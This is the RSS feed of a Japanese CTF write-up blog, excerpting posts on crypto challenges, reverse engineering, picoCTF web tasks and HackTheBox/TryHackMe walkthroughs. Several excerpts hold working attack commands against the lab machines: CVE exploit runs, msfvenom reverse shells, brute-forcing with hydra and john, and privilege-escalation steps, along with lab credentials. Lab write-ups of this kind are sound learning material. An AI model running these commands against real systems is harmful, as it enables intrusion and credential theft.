<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Writeups on お茶は綾鷹派</title>
    <link>http://side-realms.github.io/writeup/</link>
    <description>Recent content in Writeups on お茶は綾鷹派</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 13 Aug 2024 23:18:46 +0900</lastBuildDate><atom:link href="http://side-realms.github.io/writeup/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>LITCTF2024</title>
      <link>http://side-realms.github.io/writeup/litctf2024/</link>
      <pubDate>Tue, 13 Aug 2024 23:18:46 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/litctf2024/</guid>
      <description>Crypto simple otp 与えられた鍵と XOR する
import random encoded_with_xor = b&amp;#39;\x81Nx\x9b\xea)\xe4\x11\xc5 e\xbb\xcdR\xb7\x8f:\xf8\x8bJ\x15\x0e.n\\-/4\x91\xdcN\x8a&amp;#39; random.seed(0) key = random.randbytes(32) #print(key ^ encoded_with_xor) print(bytes(a ^ b for a, b in zip(key, encoded_with_xor))) privatekey N = 91222155440553152389498614260050699731763350575147080767270489977917091931170943138928885120658877746247611632809405330094823541534217244038578699660880006339704989092479659053257803665271330929925869501196563443668981397902668090043639708667461870466802555861441754587186218972034248949207279990970777750209 e = 89367874380527493290104721678355794851752244712307964470391711606074727267038562743027846335233189217972523295913276633530423913558009009304519822798850828058341163149186400703842247356763254163467344158854476953789177826969005741218604103441014310747381924897883873667049874536894418991242502458035490144319 c = 71713040895862900826227958162735654909383845445237320223905265447935484166586100020297922365470898490364132661022898730819952219842679884422062319998678974747389086806470313146322055888525887658138813737156642494577963249790227961555514310838370972597205191372072037773173143170516757649991406773514836843206 e がデカい
import owiener from Crypto.Util.number import * e = ... n = ... c = ... d = owiener.attack(e, n) print(&amp;#34;d={}&amp;#34;.format(d)) plain = pow(c, d, n) print(long_to_bytes(plain).strip()) pope shuffle it&amp;rsquo;s like caesar cipher but better.</description>
    </item>
    
    <item>
      <title>WaniCTF2024</title>
      <link>http://side-realms.github.io/writeup/wanictf2024/</link>
      <pubDate>Tue, 25 Jun 2024 18:50:04 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/wanictf2024/</guid>
      <description>waniCTF に半日参加しました． 友達はいないのでソロです．
writeup crypto beginners_rsa from Crypto.Util.number import * p = getPrime(64) q = getPrime(64) r = getPrime(64) s = getPrime(64) a = getPrime(64) n = p*q*r*s*a e = 0x10001 FLAG = b&amp;#39;FLAG{This_is_a_fake_flag}&amp;#39; m = bytes_to_long(FLAG) enc = pow(m, e, n) print(f&amp;#39;n = {n}&amp;#39;) print(f&amp;#39;e = {e}&amp;#39;) print(f&amp;#39;enc = {enc}&amp;#39;) Multi Prime RSA です． 与えられた n は簡単に素因数分解できるので，d が求まり，簡単に復号できます. 素因数分解はなんでもいいんですが今回は Msieve を使いました(参考).
from Crypto.Util.number import inverse, long_to_bytes n = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347 e = 0x10001 enc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265 p = 9953162929836910171 q = 11771834931016130837 r = 12109985960354612149 s = 13079524394617385153 a = 17129880600534041513 phi_n = (p - 1) * (q - 1) * (r - 1) * (s - 1) * (a - 1) d = inverse(e, phi_n) m = pow(enc, d, n) FLAG = long_to_bytes(m) print(FLAG) beginners_aes from Crypto.</description>
    </item>
    
    <item>
      <title>Cryptohack2</title>
      <link>http://side-realms.github.io/writeup/cryptohack2/</link>
      <pubDate>Sun, 09 Jun 2024 20:08:31 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/cryptohack2/</guid>
      <description>Structure of AES def matrix2bytes(matrix): &amp;#34;&amp;#34;&amp;#34; Converts a 4x4 matrix into a 16-byte array. &amp;#34;&amp;#34;&amp;#34; for i in range(4): for j in range(4): print(str(long_to_bytes(matrix[i][j]))[2:-1], end=&amp;#39;&amp;#39;) Round Key def add_round_key(s, k): for i in range(4): for j in range(4): state[i][j] = state[i][j] ^ round_key[i][j] return (state) print(matrix2bytes(add_round_key(state, round_key))) Confusion through Substitution from Crypto.Util.number import long_to_bytes def matrix2bytes(matrix): &amp;#34;&amp;#34;&amp;#34; Converts a 4x4 matrix into a 16-byte array. &amp;#34;&amp;#34;&amp;#34; for i in range(4): for j in range(4): print(str(long_to_bytes(matrix[i][j]))[2:-1], end=&amp;#39;&amp;#39;) def sub_bytes(s, sbox=s_box): for i in range(4): for j in range(4): tmp = str(hex(s[i][j]))[2:] #print(tmp[0]) s[i][j] = sbox[int(tmp, base=16)] return(state) Diffusion through Permutation def inv_shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3] inv_mix_columns(state) inv_shift_rows(state) print(matrix2bytes(state)) Bringing It All Together N_ROUNDS = 10 key = b&amp;#39;\xc3,\\\xa6\xb5\x80^\x0c\xdb\x8d\xa5z*\xb6\xfe\\&amp;#39; ciphertext = b&amp;#39;\xd1O\x14j\xa4+O\xb6\xa1\xc4\x08B)\x8f\x12\xdd&amp;#39; s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16, ) inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D, ) def bytes2matrix(text): return [list(text[i:i+4]) for i in range(0, len(text), 4)] def matrix2bytes(matrix): out = [] for r in matrix: for c in r: out.</description>
    </item>
    
    <item>
      <title>HTB_devvortex</title>
      <link>http://side-realms.github.io/writeup/htb_devvortex/</link>
      <pubDate>Sat, 08 Jun 2024 15:25:30 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/htb_devvortex/</guid>
      <description>user nmap ssh, http http まず ffuf で subdomain を探す ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://devvortex.htb -H &amp;quot;Host: FUZZ.devvortex.htb&amp;quot; -fw 4 -t 100 次にディレクトリを探す ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://dev.vortex.htb/FUZZ -t 100 -ic /administrator が見つかる Joomla! で動いている Joomla! https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla version を見つける /administrator/manifests/files/joomla.xml CVE が刺さる https://github.com/Acceis/exploit-CVE-2023-23752 ruby exploit.rb http://dev.devvortex.htb Users [649] lewis (lewis) - lewis@devvortex.htb - Super Users [650] logan paul (logan) - logan@devvortex.htb - Registered Site info Site name: Development Editor: tinymce Captcha: 0 Access: 1 Debug status: false Database info DB type: mysqli DB host: localhost DB user: lewis DB password: P4ntherg0t1n5r3c0n## DB name: joomla DB prefix: sd4fg_ DB encryption 0 revshell Template -&amp;gt; Customise(Cassiopeia) を編集する error.</description>
    </item>
    
    <item>
      <title>HTB: Bizness</title>
      <link>http://side-realms.github.io/writeup/htb_bizness/</link>
      <pubDate>Wed, 05 Jun 2024 04:49:04 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/htb_bizness/</guid>
      <description>user nmap ssh, http, ssl/http あたり http アクセスでサイトが立ち上がる ffuf /control OFBiz らしい こういうのはまず公式サイトから構成を簡単にさらう OFBiz Registered User が見つかる 下にバージョンが書いてある HTB の方でもバージョンを探せ，とあるのでおそらく CVE がある https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz CVE CVE が刺さる python3 ofbiz_exploit.py https://bizness.htb shell IP:4444 shell shell に入れた /home/ofbiz/user.txt root sudo -l 無理でした Derby /opt/ofbiz に色々インストールされてる config を見ると SHA が ~ とかいろいろ書かれている ofbiz@bizness:/opt/ofbiz/framework/security/config$ cat security.properties derby に関するファイルを探す /opt/ofbiz/runtime/data/derby 列挙すると seg0 に .dat がたくさん入ってる find . -type f -name “*.dat” -exec grep “SHA” {} \; c5490.</description>
    </item>
    
    <item>
      <title>HTB: Beginner</title>
      <link>http://side-realms.github.io/writeup/beginner/</link>
      <pubDate>Fri, 24 May 2024 21:22:04 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/beginner/</guid>
      <description>HTB, しばらくやってなかったらアカウント忘れてしまった
新しくアカウントを作って starting point も終えたので，やっていきたい
Weak RSA from Crypto.PublicKey import RSA pubkey = RSA.importKey(open(&amp;#34;key.pub&amp;#34;).read()) e = pubkey.e n = pubkey.n print(&amp;#34;e :&amp;#34;, e) print(&amp;#34;n :&amp;#34;, n) これで e, n を計算する． e が巨大なので以下のように攻撃する
import owiener from Crypto.Util.number import * e = 68180928631284147212820507192605734632035524131139938618069575375591806315288775310503696874509130847529572462608728019290710149661300246138036579342079580434777344111245495187927881132138357958744974243365962204835089753987667395511682829391276714359582055290140617797814443530797154040685978229936907206605 n = 573177824579630911668469272712547865443556654086190104722795509756891670023259031275433509121481030331598569379383505928315495462888788593695945321417676298471525243254143375622365552296949413920679290535717172319562064308937342567483690486592868352763021360051776130919666984258847567032959931761686072492923 d = owiener.attack(e, n) if d is None: print(&amp;#34;Failed&amp;#34;) else: print(&amp;#34;d={}&amp;#34;.format(d)) with open(&amp;#39;flag.enc&amp;#39;, &amp;#39;rb&amp;#39;) as ct: sc = bytes_to_long(ct.read()) plain = pow(c, d, n) print(long_to_bytes(plain).strip()) Jerry nmap: http-proxy 8080 ip:8080 にアクセスする tomcat が開いている /manager/html が管理画面っぽい デフォルトパスワードをブルートフォースすると tomcat:s3cret で通る .</description>
    </item>
    
    <item>
      <title>Lame</title>
      <link>http://side-realms.github.io/writeup/lame/</link>
      <pubDate>Wed, 22 May 2024 21:27:57 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/lame/</guid>
      <description>user enum4linux Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers tmp Disk oh noes! opt Disk IPC$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP LAME tmp で anonymous ログインができる ファイルを見てみたがよく分からなかった vmware の authlog のようなものがある samba 3.0.20 がある metasploit で調べると exploit が見つかる 刺さる root metasploit の exploit で root ログインだったので root も手に入れた </description>
    </item>
    
    <item>
      <title>Rev を雑多に解く1</title>
      <link>http://side-realms.github.io/writeup/rev_1/</link>
      <pubDate>Mon, 06 May 2024 05:03:30 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/rev_1/</guid>
      <description>SECCON Beginners 2023 Half strings で見える
ctf4b{ge4_t0_kn0w_the_bin4ry_fi1e_with_s4ring3}
Three length = strlen(input); if (length == 0x31) { for (local_c = 0; local_c &amp;lt; 0x31; local_c = local_c + 1) { if (local_c % 3 == 0) { cVar1 = (char)*(undefined4 *)(flag_0 + (long)(local_c / 3) * 4); } else if (local_c % 3 == 1) { cVar1 = (char)*(undefined4 *)(flag_1 + (long)(local_c / 3) * 4); } else { cVar1 = (char)*(undefined4 *)(flag_2 + (long)(local_c / 3) * 4); } if (cVar1 !</description>
    </item>
    
    <item>
      <title>Cryptohack1</title>
      <link>http://side-realms.github.io/writeup/cryptohack/</link>
      <pubDate>Sat, 04 May 2024 22:10:33 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/cryptohack/</guid>
      <description>Encoding Challenge from pwn import * # pip install pwntools import json import base64 import codecs r = remote(&amp;#39;socket.cryptohack.org&amp;#39;, 13377) def json_recv(): line = r.recvline() return json.loads(line.decode()) def json_send(hsh): request = json.dumps(hsh).encode() r.sendline(request) def decoding(types, received): if(types == &amp;#34;base64&amp;#34;): answer = base64.b64decode(received).decode() return answer if(types == &amp;#34;hex&amp;#34;): answer = str(bytes.fromhex(received)) return answer[2:len(answer)-1] if(types == &amp;#34;rot13&amp;#34;): answer = codecs.encode(received, &amp;#39;rot_13&amp;#39;) return answer if(types == &amp;#34;bigint&amp;#34;): answer = str(bytes.fromhex(received[2:])) return answer[2:len(answer)-1] if(types == &amp;#34;utf-8&amp;#34;): answer = &amp;#34;&amp;#34; for i in received: answer += chr(i) return answer while (True): received = json_recv() print(&amp;#34;Received type: &amp;#34;, end=&amp;#34;&amp;#34;) print(received[&amp;#34;type&amp;#34;]) print(&amp;#34;Received encoded value: &amp;#34;, end=&amp;#34;&amp;#34;) print(received[&amp;#34;encoded&amp;#34;]) answer = decoding(received[&amp;#34;type&amp;#34;], received[&amp;#34;encoded&amp;#34;]) print(&amp;#34;answer: &amp;#34;, end=&amp;#34;&amp;#34;) print(answer) to_send = {&amp;#34;decoded&amp;#34;: answer} request = json.</description>
    </item>
    
    <item>
      <title>picoCTF - web</title>
      <link>http://side-realms.github.io/writeup/picoweb/</link>
      <pubDate>Thu, 02 May 2024 10:39:24 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/picoweb/</guid>
      <description>なかなか初心者を抜け出せないので，量をこなそう作戦
解いたことがある問題は記載しない
WebDecode 開発者ツール的なので About ページを見ると怪しい文字列があるので，base64 デコード
Intro to Burp アカウントを作ると OTP を求められる． リクエストの otp= を消してリクエストを送ると OK
curl -X POST http://titan.picoctf.net:54630/dashboard -H &#39;Cookie: session=.eJxdjDkOwyAUBe9CnQIwi8llEBhQkA0fsciKotw9tKSct8wHHbG_0RPFMybIgB7oaDXoDqfPMxZSWYUp3VwQnOzMcUbMrri1WAbiFSaUGSnU_IVxXTqb5Bcb9DKZ4U1wPrGY1m6obtmUF2Sv80jW16UYzdc_4_cH_-A4Iw.ZjLzXA.osPDJuPjvfZFlwhe-7dVDbKhZj0&#39;
Unminify 開発者ツールを見る
Trickster 画像をアップロードできる． アップロードできる系はシェルが通りそうなことを HTB で学んだのでやってみる．
User-agent: * Disallow: /instructions.txt Disallow: /uploads/ robots.txt から /uploads/ にアップロードした画像が置いてあるような気がする． また，X-Powered-By を見れば PHP 製であることが分かるので，PHP が通る．
さらに instructions.txt を見ると，ut wikipedia says that the first few bytes contain &#39;PNG&#39; in hexadecimal: &amp;quot;50 4E 47&amp;quot; ) みたいに書いてあるので， 50 4E 47 -&amp;gt; PNG が書いてあればいいんだと思う</description>
    </item>
    
    <item>
      <title>picoCTF の rev 全部解く</title>
      <link>http://side-realms.github.io/writeup/picorev/</link>
      <pubDate>Sun, 07 Apr 2024 19:40:38 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/picorev/</guid>
      <description>CTF の問題を解いていると，解けはするけど異常に時間がかかる，みたいなことが多い． rev に限れば，これは，ツールの使い方が甘かったり，つまみ食い的に rev をやってきたので常識が欠落していて遠回りしていたり，そもそもデコンパイル結果を読む筋力が全然なかったりすることが原因だと分かっている． なので，数をこなそう作戦で，知り合いにオススメされた picoCTF の rev を全部解いてみる． 2~3 日くらいで完走できたら良い
Transformation &#39;&#39;.join([chr((ord(flag[i]) &amp;lt;&amp;lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)]) をデコードする encoded_flag = &amp;#34;灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸弲㘶㠴挲ぽ&amp;#34; flag = [] for i in range(len(encoded_flag)): tmp1 = ord(encoded_flag[i]) &amp;amp; 0xFF tmp2 = ord(encoded_flag[i]) &amp;gt;&amp;gt; 8 flag += chr(tmp2) flag += chr(tmp1) print(&amp;#34;&amp;#34;.join(flag)) keygenme-py Arcane Calculator なるものが動いていて，ライセンスを入れるといいらしい def check_key(key, username_trial): global key_full_template_trial if len(key) != len(key_full_template_trial): return False else: # Check static base key part --v i = 0 for c in key_part_static1_trial: if key[i] !</description>
    </item>
    
    <item>
      <title>Anonforce</title>
      <link>http://side-realms.github.io/writeup/anonforce/</link>
      <pubDate>Sun, 07 Apr 2024 05:14:09 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/anonforce/</guid>
      <description>user ftp に anonymous ログインができる user.txt を見る root 謎に noread ディレクトリがあるのでここの backup.pgp と private.asc をダウンロード gpg2john private.asc &amp;gt; private john --wordlist=/usr/share/wordlists/rockyou.txt private gpg --import private.asc gpg --decrypt backup.pgp shadow ファイルが手に入るので root のパスワードを復元して ssh </description>
    </item>
    
    <item>
      <title>Disgruntled</title>
      <link>http://side-realms.github.io/writeup/disgruntled/</link>
      <pubDate>Sun, 07 Apr 2024 05:07:47 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/disgruntled/</guid>
      <description>Task3 cat /var/log/auth.log |grep install Task4 cat /var/log/auth.log |grep adduser cat /var/log/auth.log |grep visudo cat /var/log/auth.log |grep vi Task5 it-admin がユーザーであることが分かったので cat /home/it-admin/.bash_history cat /home/it-admin/.viminfo ls -la /bin/os-update cat /bin/os-update.sh Task6 cat /etc/crontab </description>
    </item>
    
    <item>
      <title>ACSC 2024 writeup</title>
      <link>http://side-realms.github.io/writeup/acsc2024/</link>
      <pubDate>Sun, 31 Mar 2024 13:24:01 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/acsc2024/</guid>
      <description>ACSC に参加しました． Twitter で hardware ジャンルのある CTF があることを知ったので参加しようと思った次第です． hardware は完答ですが，案の定 hardware 以外は解いていません(解けていません)． 次の writeup で解いてみます． 順位は 800 pts で世界 64/282(?) 位でした.
An4lyz3_1t(50pts, 140 solved) .sal のバイナリデータが与えられます． logic2 で Async Serial デコードするとフラグが得られます． ボーレートに注意する必要がありますが，この程度なら典型的なボーレートでできると思います． もちろん手でもデコードできます．
0(ASCII code) 0111 0(ASCII code) 0111...
みたいな並びになっているので，ASCII code が逆順になっていることに注意して，ゴミを取り除きつつデコードすることができます．
Valut(150pts, 68 solves) 10 桁の PIN をサイドチャネル攻撃しろ，という問題でした． CTF でサイドチャネル攻撃するなら大抵タイミング攻撃なのでそうだろうと思いつつサーバを触ってみます．
時間を測ると，入力した PIN を 1 文字ずつチェックして，正解の PIN と一致していたら 0.1 秒の遅延が入るような仕組みになっているようでした．
以下がスクリプトです． 作り甘いですが&amp;hellip;
from pwn import * import time list = [&amp;#39;0&amp;#39;,&amp;#39;1&amp;#39;,&amp;#39;2&amp;#39;,&amp;#39;3&amp;#39;,&amp;#39;4&amp;#39;,&amp;#39;5&amp;#39;,&amp;#39;6&amp;#39;,&amp;#39;7&amp;#39;,&amp;#39;8&amp;#39;,&amp;#39;9&amp;#39;] io = remote(&amp;#39;vault.</description>
    </item>
    
    <item>
      <title>Boiler</title>
      <link>http://side-realms.github.io/writeup/boiler/</link>
      <pubDate>Thu, 28 Mar 2024 00:22:47 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/boiler/</guid>
      <description>user FTP anonymous login .info.txt rabbit hole webmin searchsploit 特になし CMS Joomla Joomla 3.8 joomla-brute とかいろいろ試したけどクレデンシャルが手に入らず RCE 断念 エンドポイントにクレデンシャルが露出しているらしいがアクセスできなかった(ref: How to bypass the admin login page in Joomla &amp;amp; RCE) gobuster をさらにかけると ./_test がアクセスできる それ以外は rabbit hole(いい加減にしてくれ&amp;hellip;) sar2html が動いている searchsploit で探すと RCE ができるらしい ls で log.txt が見つかる cat log.txt でクレデンシャルが見つかる basterd:superduperp@$$ ssh する ssh backup.sh が見つかる パスワードがハードコードしてある stoner にユーザを変える .secret が見つかる root SUID find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&amp;gt; /dev/null find が使えるらしい /usr/bin/find .</description>
    </item>
    
    <item>
      <title>Internal</title>
      <link>http://side-realms.github.io/writeup/internal/</link>
      <pubDate>Wed, 20 Mar 2024 08:06:49 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/internal/</guid>
      <description>user wordpress っぽいので wpscan wpscan --url http://internal.thm/blog -e admin が見つかる wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt パスワードも見つかる wordpress にログインできた Appearance から 404.php を編集してリバースシェルを入れる(WordPress: Reverse Shell) http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php にアクセス aubreanna にしか権限がないため，user.txt が見れない 分からなすぎるので writeup を見ると，/opt にパスワードがあるらしい(は？) su aubreanna で権限昇格 root aubreanna の /home に jenkins.txt がある aubreanna@internal:~$ cat jenkins.txt cat jenkins.txt Internal Jenkins service is running on 172.17.0.2:8080 ssh トンネル ssh -L 1234:172.17.0.2:8080 aubrenna@internal.thm http://127.0.0.1:8080 で jenkins にアクセスできる hydra 127.0.0.1 -s 8080 -V -f http-form-post &amp;quot;/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^&amp;amp;from=%2F&amp;amp;Submit=Sign+in&amp;amp;Login=Login:Invalid username or password&amp;quot; -l admin -P /usr/share/wordlists/rockyou.</description>
    </item>
    
    <item>
      <title>Rerevand</title>
      <link>http://side-realms.github.io/writeup/rerevand/</link>
      <pubDate>Mon, 18 Mar 2024 09:58:44 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/rerevand/</guid>
      <description>user smb が開いてるのでこれを起点にする enum4linux は動かなかった nmap よく見たら windows だった smbclient -L \\\\ip で使えそうな share を探す nt4wrksv が使えそう パスワードなしで入れる パスワードリストが手に入る nt4wrksv が書き込み可能なのでリバースシェルを入れる(SMB (Server Message Block) Pentesting - Exploit Notes) msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=ip lport=port -f aspx -o shell.asp smb: \&amp;gt; put shell.aspx curl http://10.10.16.163:49663/nt4wrksv/shell.aspx root SeImpersonatePrivilege が使える(Abusing Tokens - HackTricks) wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe を使う eterpreter &amp;gt; getprivs Enabled Process Privileges ========================== Name ---- SeAssignPrimaryTokenPrivilege SeAuditPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeImpersonatePrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege meterpreter &amp;gt; shell C:\users\bob\desktop&amp;gt;cd c:/inetpub/wwwroot/nt4wrksv cd c:/inetpub/wwwroot/nt4wrksv c:\inetpub\wwwroot\nt4wrksv&amp;gt;dir dir Volume in drive C has no label.</description>
    </item>
    
    <item>
      <title>Daily Bugle</title>
      <link>http://side-realms.github.io/writeup/dailybugle/</link>
      <pubDate>Sun, 17 Mar 2024 04:41:11 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/dailybugle/</guid>
      <description>user.txt Joomla! というのが動いてる /language/en-GB/en-GB.xml にアクセスするとバージョンが見える(Joomla - HackTricks) searchsploit で SQLi がヒットする python のエクスプロイトコードが出ている(Exploit-Joomla) ユーザ名とパスワードハッシュが得られる Joomla にログイン リバースシェルが template に貼れる(Joomla: Reverse Shell) beez3 に php リバースシェルを貼る save する nc -nlvp 1234 リバースシェル apache としてログイン，権限がなく user.txt が見れない linpeas.sh でパスワードが露出していることが分かる（どういう仕組みなんだこれ） su jjameson root yum が使えるらしい rpm ロードをやろうとしたが fpm が使えず断念 TF=$(mktemp -d) cat &amp;gt;$TF/x&amp;lt;&amp;lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat &amp;gt;$TF/y.conf&amp;lt;&amp;lt;EOF [main] enabled=1 EOF cat &amp;gt;$TF/y.py&amp;lt;&amp;lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=&amp;#39;2.</description>
    </item>
    
    <item>
      <title>Gamezone</title>
      <link>http://side-realms.github.io/writeup/gamezone/</link>
      <pubDate>Sun, 17 Mar 2024 04:41:11 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/gamezone/</guid>
